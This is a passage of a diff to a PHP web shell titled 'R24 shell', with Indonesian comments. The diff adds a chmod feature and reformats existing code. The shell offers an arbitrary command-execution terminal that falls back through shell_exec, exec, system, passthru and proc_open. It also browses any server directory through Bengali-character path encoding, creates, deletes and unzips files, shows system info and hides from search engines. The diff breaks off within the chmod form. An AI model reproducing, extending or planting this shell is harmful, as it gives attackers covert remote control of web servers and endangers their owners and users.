@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>R24ˢʰᵉˡˡ</title>
+    <title>R24ˢʰᵉˡˣ</title>
     <meta name="robots" content="noindex,nofollow">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
@@ -65,7 +65,6 @@
         justify-content: space-between;
         align-items: center;
         width: 100%;
-        /* margin-bottom: 10px; */
         margin-bottom: -20px;
     }
     .navbar-bottom {
@@ -89,11 +88,8 @@
     .path-label {
         color: #ffc107;
         font-weight: bold;
-        /* background-color: #3d3d3d; */
         padding: 3px 8px;
-        /* border-radius: 4px; */
         font-size: 0.9em;
-        /* border: 1px solid #007bff; */
     }
     .path-value {
         color: #ffffff;
@@ -124,7 +120,6 @@
         right: 99px;
         top: 50px;
         position: relative;
-        /* overflow: hidden; */
         margin-left: auto;
     }
     
@@ -228,6 +223,17 @@
         border-color: #1e7e34;
         color: #ffffff;
     }
+    .btn-warning {
+        background-color: #ffc107;
+        border-color: #b38f00;
+        color: #000000;
+        font-weight: bold;
+    }
+    .btn-warning:hover {
+        background-color: #b38f00;
+        border-color: #8a6d00;
+        color: #ffffff;
+    }
     
     /* Table Dark Theme */
     .table {
@@ -281,23 +287,49 @@
     }
     
     /* Permission Colors for Dark Theme */
-    .perms-safe { color: #4caf50 !important; font-weight: bold; }
-    .perms-warning { color: #ffc107 !important; font-weight: bold; }
-    .perms-danger { color: #f44336 !important; font-weight: bold; }
-    .perms-info { color: #17a2b8 !important; font-weight: bold; }
+    .perms-not-writable { 
+        color: #adb5bd !important; 
+        font-weight: bold; 
+        opacity: 0.7;
+    }
+    .perms-safe { 
+        color: #4caf50 !important; 
+        font-weight: bold; 
+    }
+    .perms-info { 
+        color: #17a2b8 !important; 
+        font-weight: bold; 
+    }
+    .perms-warning { 
+        color: #ffc107 !important; 
+        font-weight: bold; 
+    }
+    .perms-danger { 
+        color: #f44336 !important; 
+        font-weight: bold; 
+    }
     
     /* Action Icons */
     .table td a i {
         color: #ffffff;
         margin: 0 5px;
         font-size: 1.1em;
+        transition: color 0.2s ease;
     }
     .table td a i:hover {
-        color: #007bff;
+        color: #ffc107 !important;
+    }
+    
+    /* Icon kunci spesifik */
+    .table td a i.fa-key {
+        color: #ffffff;
+    }
+    .table td a i.fa-key:hover {
+        color: #ffc107 !important;
     }
     
     /* Form Dark Theme */
-    .date-picker-form, .create-folder-form, .upload-form, .rename-form, .create-file-form, .cmd-form {
+    .date-picker-form, .create-folder-form, .upload-form, .rename-form, .create-file-form, .cmd-form, .chmod-form {
         background: #2d2d2d;
         padding: 20px;
         border-radius: 5px;
@@ -358,33 +390,27 @@
         border-color: #3d4248;
     }
 
-
-    i.fa-regular.fa-file,i.fa-solid.fa-terminal,i.fa-solid.fa-house,i.fa-solid.fa-upload,.fa-folder {
+    /* Icons */
+    i.fa-regular.fa-file, i.fa-solid.fa-terminal, i.fa-solid.fa-house, i.fa-solid.fa-upload, .fa-folder {
         color: #ffc107;
         margin-right: 5px;
     }
-
     .fa-solid, .fa-regular, .fa-brands {
         margin-right: 5px;
     }
-
-    i.fa.fa-trash,i.fa-regular.fa-calendar,i.fa-sharp.fa-regular.fa-pen-to-square,i.fa-solid.fa-file-pen{
+    i.fa.fa-trash, i.fa-regular.fa-calendar, i.fa-sharp.fa-regular.fa-pen-to-square, i.fa-solid.fa-file-pen {
         color: #ffffff;
     }
-
-    i.fa.fa-trash:hover{
+    i.fa.fa-trash:hover {
         color: #f44336;
     }
-
-    i.fa-regular.fa-calendar:hover{
-color: #ffc107;
+    i.fa-regular.fa-calendar:hover {
+        color: #ffc107;
     }
-
-    i.fa-sharp.fa-regular.fa-pen-to-square:hover{
-color: #ffc107;
+    i.fa-sharp.fa-regular.fa-pen-to-square:hover {
+        color: #ffc107;
     }
-
-    i.fa-solid.fa-file-pen:hover{
+    i.fa-solid.fa-file-pen:hover {
         color: #ffc107;
     }
     
@@ -462,20 +488,16 @@ color: #ffc107;
         font-size: 14px;
         line-height: 1.6;
     }
-    
     .CodeMirror-gutters {
         background-color: #2d2d2d;
         border-right: 1px solid #007bff;
     }
-    
     .CodeMirror-linenumber {
         color: #ffc107;
     }
-    
     .CodeMirror-cursor {
         border-left: 2px solid #ffc107;
     }
-    
     .CodeMirror-selected {
         background-color: #4d4d4d !important;
     }
@@ -492,7 +514,6 @@ color: #ffc107;
         justify-content: space-between;
         align-items: center;
     }
-    
     .editor-language {
         color: #ffc107;
         font-weight: bold;
@@ -511,7 +532,6 @@ color: #ffc107;
         max-height: 400px;
         overflow-y: auto;
     }
-    
     .terminal-error {
         background-color: #1a1a1a;
         border: 1px solid #ff6b6b;
@@ -524,7 +544,6 @@ color: #ffc107;
         max-height: 400px;
         overflow-y: auto;
     }
-    
     .terminal-output pre, .terminal-error pre {
         margin: 0;
         background-color: transparent;
@@ -533,10 +552,28 @@ color: #ffc107;
         white-space: pre-wrap;
         word-wrap: break-word;
     }
-    
     .terminal-prompt {
         color: #ffc107;
         font-weight: bold;
+    }
+    
+    /* Chmod Form Styles (sederhana) */
+    .chmod-preview {
+        background-color: #3d3d3d;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 15px 0;
+        border-left: 4px solid #ffc107;
+    }
+    .current-perms-badge {
+        display: inline-block;
+        padding: 5px 10px;
+        border-radius: 4px;
+        font-family: monospace;
+        font-size: 1.1em;
+        margin-right: 10px;
+        background-color: #1a1a1a;
+        border: 1px solid #ffc107;
     }
     
     /* Responsive */
@@ -554,9 +591,7 @@ color: #ffc107;
             flex-wrap: wrap;
         }
         .logo-container {
-            /* width: 120px; */
             width: 100%;
-            /* height: 50px; */
             margin-left: 35;
         }
         .logo {
@@ -573,282 +608,304 @@ color: #ffc107;
 
 <body>
 
-    <?php
+<?php
+// Fungsi untuk mengecek apakah file/folder writable
+function isWritable($path)
+{
+    return is_writable($path);
+}
 
-    function getPermsColorClass($perms)
-    {
-        $perms_value = (int)$perms;
-        
-        if ($perms_value <= 644) {
-            return 'perms-safe';
-        } elseif ($perms_value >= 645 && $perms_value <= 654) {
-            return 'perms-info';
-        } elseif ($perms_value >= 655 && $perms_value <= 664) {
-            return 'perms-warning';
-        } elseif ($perms_value >= 665 && $perms_value <= 666) {
-            return 'perms-danger';
-        } elseif ($perms_value == 755) {
-            return 'perms-safe';
-        } elseif ($perms_value >= 767 && $perms_value <= 777) {
-            return 'perms-danger';
-        } else {
-            if (substr($perms, -1) >= 6) {
-                return 'perms-warning';
-            } elseif (substr($perms, -2, 1) >= 6) {
-                return 'perms-info';
-            } else {
-                return 'perms-safe';
-            }
-        }
-    }
-
-    function formatSizeUnits($bytes)
-    {
-        if ($bytes >= 1073741824) {
-            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
-        } elseif ($bytes >= 1048576) {
-            $bytes = number_format($bytes / 1048576, 2) . ' MB';
-        } elseif ($bytes >= 1024) {
-            $bytes = number_format($bytes / 1024, 2) . ' KB';
-        } elseif ($bytes > 1) {
-            $bytes = $bytes . ' bytes';
-        } elseif ($bytes == 1) {
-            $bytes = $bytes . ' byte';
-        } else {
-            $bytes = '0 bytes';
-        }
-        return $bytes;
-    }
-
-    function fileExtension($file)
-    {
-        return substr(strrchr($file, '.'), 1);
-    }
-
-    function fileIcon($file)
-    {
-        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
-        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
-        $ext = strtolower(fileExtension($file));
-        if ($file == "error_log") {
-            return '<i class="fa-sharp fa-solid fa-bug" style="color: #f44336;"></i> ';
-        } elseif ($file == ".htaccess") {
-            return '<i class="fa-solid fa-hammer" style="color: #ffc107;"></i> ';
-        }
-        if ($ext == "html" || $ext == "htm") {
-            return '<i class="fa-brands fa-html5" style="color: #f44336;"></i> ';
-        } elseif ($ext == "php" || $ext == "phtml") {
-            return '<i class="fa-brands fa-php" style="color: #4caf50;"></i> ';
-        } elseif (in_array($ext, $imgs)) {
-            return '<i class="fa-regular fa-images" style="color: #ffc107;"></i> ';
-        } elseif ($ext == "css") {
-            return '<i class="fa-brands fa-css3" style="color: #17a2b8;"></i> ';
-        } elseif ($ext == "txt") {
-            return '<i class="fa-regular fa-file-lines" style="color: #adb5bd;"></i> ';
-        } elseif (in_array($ext, $audio)) {
-            return '<i class="fa-duotone fa-file-music" style="color: #ffc107;"></i> ';
-        } elseif ($ext == "py") {
-            return '<i class="fa-brands fa-python" style="color: #ffc107;"></i> ';
-        } elseif ($ext == "js") {
-            return '<i class="fa-brands fa-js" style="color: #ffc107;"></i> ';
-        } elseif ($ext == "zip" || $ext == "rar" || $ext == "7z" || $ext == "tar" || $ext == "gz") {
-            return '<i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i> ';
-        } else {
-            return '<i class="fa-solid fa-file" style="color: #adb5bd;"></i> ';
-        }
-    }
-
-    function encodePath($path)
-    {
-        $a = array("/", "\\", ".", ":");
-        $b = array("ক", "খ", "গ", "ঘ");
-        return str_replace($a, $b, $path);
+// Modifikasi fungsi getPermsColorClass untuk membedakan permission yang bisa diedit
+function getPermsColorClass($perms, $path)
+{
+    $perms_value = (int)$perms;
+    $writable = isWritable($path);
+    
+    // Jika tidak writable, beri warna abu-abu
+    if (!$writable) {
+        return 'perms-not-writable';
     }
     
-    function decodePath($path)
-    {
-        $a = array("/", "\\", ".", ":");
-        $b = array("ক", "খ", "গ", "ঘ");
-        return str_replace($b, $a, $path);
-    }
-
-    // Fungsi untuk mendapatkan mode CodeMirror berdasarkan ekstensi file
-    function getCodeMirrorMode($ext)
-    {
-        $modes = [
-            'php' => 'php',
-            'phtml' => 'php',
-            'html' => 'htmlmixed',
-            'htm' => 'htmlmixed',
-            'css' => 'css',
-            'js' => 'javascript',
-            'jsx' => 'javascript',
-            'ts' => 'javascript',
-            'tsx' => 'javascript',
-            'py' => 'python',
-            'rb' => 'ruby',
-            'java' => 'clike',
-            'c' => 'clike',
-            'cpp' => 'clike',
-            'cs' => 'clike',
-            'go' => 'go',
-            'rs' => 'rust',
-            'sql' => 'sql',
-            'json' => 'json',
-            'xml' => 'xml',
-            'svg' => 'xml',
-            'yaml' => 'yaml',
-            'yml' => 'yaml',
-            'md' => 'markdown',
-            'sh' => 'shell',
-            'bash' => 'shell',
-            'zsh' => 'shell',
-        ];
-        
-        return isset($modes[$ext]) ? $modes[$ext] : 'htmlmixed';
-    }
-
-    // Fungsi untuk unzip file langsung di lokasi yang sama
-    function unzipFile($zip_file, $destination)
-    {
-        if (!class_exists('ZipArchive')) {
-            return false;
+    if ($perms_value <= 644) {
+        return 'perms-safe';
+    } elseif ($perms_value >= 645 && $perms_value <= 654) {
+        return 'perms-info';
+    } elseif ($perms_value >= 655 && $perms_value <= 664) {
+        return 'perms-warning';
+    } elseif ($perms_value >= 665 && $perms_value <= 666) {
+        return 'perms-danger';
+    } elseif ($perms_value == 755) {
+        return 'perms-safe';
+    } elseif ($perms_value >= 767 && $perms_value <= 777) {
+        return 'perms-danger';
+    } else {
+        if (substr($perms, -1) >= 6) {
+            return 'perms-warning';
+        } elseif (substr($perms, -2, 1) >= 6) {
+            return 'perms-info';
+        } else {
+            return 'perms-safe';
         }
-        $zip = new ZipArchive;
-        if ($zip->open($zip_file) === TRUE) {
-            $zip->extractTo($destination);
-            $zip->close();
-            return true;
-        }
+    }
+}
+
+// Fungsi untuk mengubah permissions
+function chmodPath($path, $perms)
+{
+    if (file_exists($path)) {
+        // Konversi permission dari string ke octal
+        $octal_perms = octdec($perms);
+        return chmod($path, $octal_perms);
+    }
+    return false;
+}
+
+function formatSizeUnits($bytes)
+{
+    if ($bytes >= 1073741824) {
+        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
+    } elseif ($bytes >= 1048576) {
+        $bytes = number_format($bytes / 1048576, 2) . ' MB';
+    } elseif ($bytes >= 1024) {
+        $bytes = number_format($bytes / 1024, 2) . ' KB';
+    } elseif ($bytes > 1) {
+        $bytes = $bytes . ' bytes';
+    } elseif ($bytes == 1) {
+        $bytes = $bytes . ' byte';
+    } else {
+        $bytes = '0 bytes';
+    }
+    return $bytes;
+}
+
+function fileExtension($file)
+{
+    return substr(strrchr($file, '.'), 1);
+}
+
+function fileIcon($file)
+{
+    $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
+    $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
+    $ext = strtolower(fileExtension($file));
+    if ($file == "error_log") {
+        return '<i class="fa-sharp fa-solid fa-bug" style="color: #f44336;"></i> ';
+    } elseif ($file == ".htaccess") {
+        return '<i class="fa-solid fa-hammer" style="color: #ffc107;"></i> ';
+    }
+    if ($ext == "html" || $ext == "htm") {
+        return '<i class="fa-brands fa-html5" style="color: #f44336;"></i> ';
+    } elseif ($ext == "php" || $ext == "phtml") {
+        return '<i class="fa-brands fa-php" style="color: #4caf50;"></i> ';
+    } elseif (in_array($ext, $imgs)) {
+        return '<i class="fa-regular fa-images" style="color: #ffc107;"></i> ';
+    } elseif ($ext == "css") {
+        return '<i class="fa-brands fa-css3" style="color: #17a2b8;"></i> ';
+    } elseif ($ext == "txt") {
+        return '<i class="fa-regular fa-file-lines" style="color: #adb5bd;"></i> ';
+    } elseif (in_array($ext, $audio)) {
+        return '<i class="fa-duotone fa-file-music" style="color: #ffc107;"></i> ';
+    } elseif ($ext == "py") {
+        return '<i class="fa-brands fa-python" style="color: #ffc107;"></i> ';
+    } elseif ($ext == "js") {
+        return '<i class="fa-brands fa-js" style="color: #ffc107;"></i> ';
+    } elseif ($ext == "zip" || $ext == "rar" || $ext == "7z" || $ext == "tar" || $ext == "gz") {
+        return '<i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i> ';
+    } else {
+        return '<i class="fa-solid fa-file" style="color: #adb5bd;"></i> ';
+    }
+}
+
+function encodePath($path)
+{
+    $a = array("/", "\\", ".", ":");
+    $b = array("ক", "খ", "গ", "ঘ");
+    return str_replace($a, $b, $path);
+}
+
+function decodePath($path)
+{
+    $a = array("/", "\\", ".", ":");
+    $b = array("ক", "খ", "গ", "ঘ");
+    return str_replace($b, $a, $path);
+}
+
+// Fungsi untuk mendapatkan mode CodeMirror berdasarkan ekstensi file
+function getCodeMirrorMode($ext)
+{
+    $modes = [
+        'php' => 'php',
+        'phtml' => 'php',
+        'html' => 'htmlmixed',
+        'htm' => 'htmlmixed',
+        'css' => 'css',
+        'js' => 'javascript',
+        'jsx' => 'javascript',
+        'ts' => 'javascript',
+        'tsx' => 'javascript',
+        'py' => 'python',
+        'rb' => 'ruby',
+        'java' => 'clike',
+        'c' => 'clike',
+        'cpp' => 'clike',
+        'cs' => 'clike',
+        'go' => 'go',
+        'rs' => 'rust',
+        'sql' => 'sql',
+        'json' => 'json',
+        'xml' => 'xml',
+        'svg' => 'xml',
+        'yaml' => 'yaml',
+        'yml' => 'yaml',
+        'md' => 'markdown',
+        'sh' => 'shell',
+        'bash' => 'shell',
+        'zsh' => 'shell',
+    ];
+    
+    return isset($modes[$ext]) ? $modes[$ext] : 'htmlmixed';
+}
+
+// Fungsi untuk unzip file langsung di lokasi yang sama
+function unzipFile($zip_file, $destination)
+{
+    if (!class_exists('ZipArchive')) {
         return false;
     }
-
-    // Fungsi untuk menghapus folder beserta semua isinya (rekursif)
-    function deleteDirectory($dir)
-    {
-        if (!file_exists($dir)) {
-            return true;
-        }
-        
-        if (!is_dir($dir)) {
-            return unlink($dir);
-        }
-        
-        foreach (scandir($dir) as $item) {
-            if ($item == '.' || $item == '..') {
-                continue;
-            }
-            
-            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
-                return false;
-            }
-        }
-        
-        return rmdir($dir);
+    $zip = new ZipArchive;
+    if ($zip->open($zip_file) === TRUE) {
+        $zip->extractTo($destination);
+        $zip->close();
+        return true;
     }
+    return false;
+}
 
-    // Fungsi untuk menjalankan command dengan berbagai metode
-    function executeCommand($cmd)
-    {
-        $output = '';
-        $return_var = -1;
+// Fungsi untuk menghapus folder beserta semua isinya (rekursif)
+function deleteDirectory($dir)
+{
+    if (!file_exists($dir)) {
+        return true;
+    }
+    
+    if (!is_dir($dir)) {
+        return unlink($dir);
+    }
+    
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') {
+            continue;
+        }
         
-        // Coba berbagai metode eksekusi
-        if (function_exists('shell_exec')) {
-            $output = shell_exec($cmd . " 2>&1");
-            $return_var = ($output === null) ? 1 : 0;
-        } elseif (function_exists('exec')) {
-            exec($cmd . " 2>&1", $output_array, $return_var);
-            $output = implode("\n", $output_array);
-        } elseif (function_exists('system')) {
-            ob_start();
-            system($cmd . " 2>&1", $return_var);
-            $output = ob_get_clean();
-        } elseif (function_exists('passthru')) {
-            ob_start();
-            passthru($cmd . " 2>&1", $return_var);
-            $output = ob_get_clean();
-        } elseif (function_exists('proc_open')) {
-            // Cek proc_open
-            $descriptorspec = [
-                0 => ["pipe", "r"],  // stdin
-                1 => ["pipe", "w"],  // stdout
-                2 => ["pipe", "w"]   // stderr
-            ];
+        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+            return false;
+        }
+    }
+    
+    return rmdir($dir);
+}
+
+// Fungsi untuk menjalankan command dengan berbagai metode
+function executeCommand($cmd)
+{
+    $output = '';
+    $return_var = -1;
+    
+    // Coba berbagai metode eksekusi
+    if (function_exists('shell_exec')) {
+        $output = shell_exec($cmd . " 2>&1");
+        $return_var = ($output === null) ? 1 : 0;
+    } elseif (function_exists('exec')) {
+        exec($cmd . " 2>&1", $output_array, $return_var);
+        $output = implode("\n", $output_array);
+    } elseif (function_exists('system')) {
+        ob_start();
+        system($cmd . " 2>&1", $return_var);
+        $output = ob_get_clean();
+    } elseif (function_exists('passthru')) {
+        ob_start();
+        passthru($cmd . " 2>&1", $return_var);
+        $output = ob_get_clean();
+    } elseif (function_exists('proc_open')) {
+        $descriptorspec = [
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["pipe", "w"]
+        ];
+        
+        $process = proc_open($cmd, $descriptorspec, $pipes, PATH, null);
+        
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[0]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            $return_var = proc_close($process);
             
-            $process = proc_open($cmd, $descriptorspec, $pipes, PATH, null);
-            
-            if (is_resource($process)) {
-                $output = stream_get_contents($pipes[1]);
-                $error = stream_get_contents($pipes[2]);
-                fclose($pipes[0]);
-                fclose($pipes[1]);
-                fclose($pipes[2]);
-                $return_var = proc_close($process);
-                
-                if (!empty($error)) {
-                    $output = $error;
-                }
-            } else {
-                $output = "Error: Failed to open process";
-                $return_var = 1;
+            if (!empty($error)) {
+                $output = $error;
             }
         } else {
-            $output = "commands proc_open function is disabled!!";
+            $output = "Error: Failed to open process";
             $return_var = 1;
         }
-        
-        return [
-            'output' => $output,
-            'return_var' => $return_var
-        ];
-    }
-
-    $root_path = __DIR__;
-    if (isset($_GET['p'])) {
-        if (empty($_GET['p'])) {
-            $p = $root_path;
-        } elseif (!is_dir(decodePath($_GET['p']))) {
-            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
-        } elseif (is_dir(decodePath($_GET['p']))) {
-            $p = decodePath($_GET['p']);
-        }
-    } elseif (isset($_GET['q'])) {
-        if (!is_dir(decodePath($_GET['q']))) {
-            echo ("<script>window.location.replace('?p=');</script>");
-        } elseif (is_dir(decodePath($_GET['q']))) {
-            $p = decodePath($_GET['q']);
-        }
     } else {
-        $p = $root_path;
+        $output = "commands proc_open function is disabled!!";
+        $return_var = 1;
     }
-    define("PATH", $p);
-
-    // Get system info
-    $system_info = php_uname("a");
     
-    // Build path breadcrumb
-    $path = str_replace('\\', '/', PATH);
-    $paths = explode('/', $path);
-    $path_breadcrumb = '';
-    foreach ($paths as $id => $dir_part) {
-        if ($dir_part == '' && $id == 0) {
-            $path_breadcrumb .= "<a href=\"?p=/\">/</a>";
-            continue;
-        }
-        if ($dir_part == '')
-            continue;
-        $path_breadcrumb .= "<a href='?p=";
-        for ($i = 0; $i <= $id; $i++) {
-            $path_breadcrumb .= str_replace(":", "ঘ", $paths[$i]);
-            if ($i != $id)
-                $path_breadcrumb .= "ক";
-        }
-        $path_breadcrumb .= "'>" . $dir_part . "</a>/";
-    }
+    return [
+        'output' => $output,
+        'return_var' => $return_var
+    ];
+}
 
-    // New navbar structure dengan logo R24 di container khusus
-    echo ('
+$root_path = __DIR__;
+if (isset($_GET['p'])) {
+    if (empty($_GET['p'])) {
+        $p = $root_path;
+    } elseif (!is_dir(decodePath($_GET['p']))) {
+        echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
+    } elseif (is_dir(decodePath($_GET['p']))) {
+        $p = decodePath($_GET['p']);
+    }
+} elseif (isset($_GET['q'])) {
+    if (!is_dir(decodePath($_GET['q']))) {
+        echo ("<script>window.location.replace('?p=');</script>");
+    } elseif (is_dir(decodePath($_GET['q']))) {
+        $p = decodePath($_GET['q']);
+    }
+} else {
+    $p = $root_path;
+}
+define("PATH", $p);
+
+// Get system info
+$system_info = php_uname("a");
+
+// Build path breadcrumb
+$path = str_replace('\\', '/', PATH);
+$paths = explode('/', $path);
+$path_breadcrumb = '';
+foreach ($paths as $id => $dir_part) {
+    if ($dir_part == '' && $id == 0) {
+        $path_breadcrumb .= "<a href=\"?p=/\">/</a>";
+        continue;
+    }
+    if ($dir_part == '')
+        continue;
+    $path_breadcrumb .= "<a href='?p=";
+    for ($i = 0; $i <= $id; $i++) {
+        $path_breadcrumb .= str_replace(":", "ঘ", $paths[$i]);
+        if ($i != $id)
+            $path_breadcrumb .= "ক";
+    }
+    $path_breadcrumb .= "'>" . $dir_part . "</a>/";
+}
+
+// New navbar structure dengan logo R24 di container khusus
+echo ('
 <nav class="navbar navbar-light">
     <div class="navbar-container">
         <div class="navbar-top">
@@ -861,7 +918,7 @@ color: #ffc107;
                     <span class="main">
                         <span class="kanji">尺</span><span class="num">24</span>
                     </span>
-                    <span class="sup">ˢʰᵉˡˡ</span>
+                    <span class="sup">ˢʰᵉˡˣ</span>
                 </div>
             </div>
         </div>
@@ -880,457 +937,509 @@ color: #ffc107;
         </div>
     </div>
 </nav>');
-        // Handle CMD - Perbaikan
-        if (isset($_GET['cmd']) && isset($_GET['q'])) {
-            $current_dir = PATH;
-            $output = '';
-            $command = '';
-            $return_var = 0;
-            
-            if (isset($_POST['execute_cmd'])) {
-                $command = $_POST['command'];
-                
-                // Simpan direktori saat ini
-                $old_dir = getcwd();
-                
-                // Ganti ke direktori yang dituju
-                if (chdir($current_dir)) {
-                    // Coba berbagai metode eksekusi
-                    if (function_exists('shell_exec')) {
-                        $output = shell_exec($command . " 2>&1");
-                        $return_var = ($output === null) ? 1 : 0;
-                    } elseif (function_exists('exec')) {
-                        exec($command . " 2>&1", $output_array, $return_var);
-                        $output = implode("\n", $output_array);
-                    } elseif (function_exists('system')) {
-                        ob_start();
-                        system($command . " 2>&1", $return_var);
-                        $output = ob_get_clean();
-                    } elseif (function_exists('passthru')) {
-                        ob_start();
-                        passthru($command . " 2>&1", $return_var);
-                        $output = ob_get_clean();
-                    } elseif (function_exists('proc_open')) {
-                        $descriptorspec = [
-                            0 => ["pipe", "r"],
-                            1 => ["pipe", "w"],
-                            2 => ["pipe", "w"]
-                        ];
-                        
-                        $process = proc_open($command, $descriptorspec, $pipes, $current_dir, null);
-                        
-                        if (is_resource($process)) {
-                            $output = stream_get_contents($pipes[1]);
-                            $error = stream_get_contents($pipes[2]);
-                            fclose($pipes[0]);
-                            fclose($pipes[1]);
-                            fclose($pipes[2]);
-                            $return_var = proc_close($process);
-                            
-                            if (!empty($error)) {
-                                $output = $error;
-                            }
-                        } else {
-                            $output = "Error: Failed to open process";
-                            $return_var = 1;
-                        }
-                    } else {
-                        $output = "ERROR: Semua fungsi command execution dinonaktifkan oleh server!";
-                        $return_var = 1;
-                    }
-                    
-                    // Kembali ke direktori sebelumnya
-                    chdir($old_dir);
-                } else {
-                    $output = "Error: Tidak dapat mengakses direktori " . $current_dir;
-                    $return_var = 1;
-                }
-                
-                // Jika output kosong, tampilkan pesan sukses
-                if (empty(trim($output))) {
-                    $output = "Command executed successfully";
-                }
-            }
-            
-            echo '
-            <div class="main-container">
-                <div class="cmd-form">
-                    <h5 style="color: #ffc107;"><i class="fa-solid fa-terminal"></i> Command Line</h5>
-                    
-                    <form method="post">
-                        <div class="row">
-                            <div class="col-md-10">
-                                <div class="input-group mb-3">
-                                    <span class="input-group-text" style="background-color: #3d3d3d; color: #ffc107; border: 1px solid #007bff; font-weight: bold;">$</span>
-                                    <input type="text" class="form-control" name="command" placeholder="ls -la" value="' . htmlspecialchars($command) . '" required autofocus style="font-family: monospace; max-width: 300px;">
-                                    <button type="submit" class="btn btn-cmd" name="execute_cmd"><i class="fa-solid fa-play"></i> Execute</button>
-                                    <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary"><i class="fa-solid fa-times"></i> Close</a>
-                                </div>
-                            </div>
-                        </div>
-                    </form>';
-            
-            if (!empty($command)) {
-                // Tampilkan output dengan border kuning
-                echo '<div class="terminal-output" style="border-color: #ffc107;">';
-                echo '<div style="border-bottom: 1px solid #007bff; padding-bottom: 8px; margin-bottom: 8px;">';
-                echo '<span style="color: #ffc107;">$</span> <span style="color: #ffffff;">' . htmlspecialchars($command) . '</span>';
-                echo '</div>';
-                
-                // Tampilkan output (selalu tampilkan, baik kosong maupun ada isi)
-                echo '<pre style="margin: 0; color: #ffffff; font-family: monospace;">' . htmlspecialchars($output) . '</pre>';
-                
-                echo '</div>';
-            }
-            
-            echo '</div></div>';
-        }
-    // Handle form actions - tampilkan di ATAS sebelum konten lainnya
-    // Create Folder Form
-    if (isset($_GET['createfolder']) && isset($_GET['q'])) {
-        echo '
-        <div class="main-container">
-            <div class="create-folder-form">
-                <h5 style="color: #ffc107;"><i class="fa-regular fa-folder"></i> Create New Folder</h5>
-                <form method="post">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label for="folder_name">Folder name:</label>
-                            <input type="text" class="form-control" name="folder_name" placeholder="Enter folder name" required autofocus>
-                        </div>
-                        <div class="col-md-12 mt-3">
-                            <input type="submit" class="btn btn-success" name="create_folder" value="Create Folder">
-                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </div>';
-        
-        if (isset($_POST['create_folder'])) {
-            $folder_name = $_POST['folder_name'];
-            $folder_path = PATH . "/" . $folder_name;
-            
-            if (!empty($folder_name)) {
-                if (!file_exists($folder_path)) {
-                    if (mkdir($folder_path, 0755)) {
-                        echo ("<script>alert('Folder berhasil dibuat: " . addslashes($folder_name) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                    } else {
-                        echo ("<script>alert('Gagal membuat folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                    }
-                } else {
-                    echo ("<script>alert('Folder dengan nama tersebut sudah ada!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
-            } else {
-                echo ("<script>alert('Nama folder tidak boleh kosong!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-            }
-        }
-    }
 
-    // Create File Form
-    if (isset($_GET['createfile']) && isset($_GET['q'])) {
-        echo '
-        <div class="main-container">
-            <div class="create-file-form">
-                <h5 style="color: #ffc107;"><i class="fa-regular fa-file"></i> Create New File</h5>
-                <form method="post">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label for="file_name">File name:</label>
-                            <input type="text" class="form-control" name="file_name" placeholder="Contoh: index.php, style.css, readme.txt" required autofocus>
-                            <div class="date-example">Gunakan ekstensi file yang sesuai</div>
-                        </div>
-                        <div class="col-md-12 mt-3">
-                            <label for="file_content">File content:</label>
-                            <textarea class="form-control" name="file_content" rows="5" placeholder="Isi file"></textarea>
-                        </div>
-                        <div class="col-md-12 mt-3">
-                            <input type="submit" class="btn btn-info" name="create_file" value="Create File">
-                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </div>';
-        
-        if (isset($_POST['create_file'])) {
-            $file_name = $_POST['file_name'];
-            $file_content = $_POST['file_content'];
-            $file_path = PATH . "/" . $file_name;
+// Handle Chmod Form (disederhanakan)
+if (isset($_GET['chmod']) && isset($_GET['q'])) {
+    $item_name = $_GET['chmod'];
+    $item_path = PATH . "/" . $item_name;
+    $current_perms = "0" . substr(decoct(fileperms($item_path)), -3);
+    
+    echo '
+    <div class="main-container">
+        <div class="chmod-form">
+            <h5 style="color: #ffc107;"><i class="fa-solid fa-key"></i> Change Permissions: ' . htmlspecialchars($item_name) . '</h5>
             
-            if (!empty($file_name)) {
-                if (!file_exists($file_path)) {
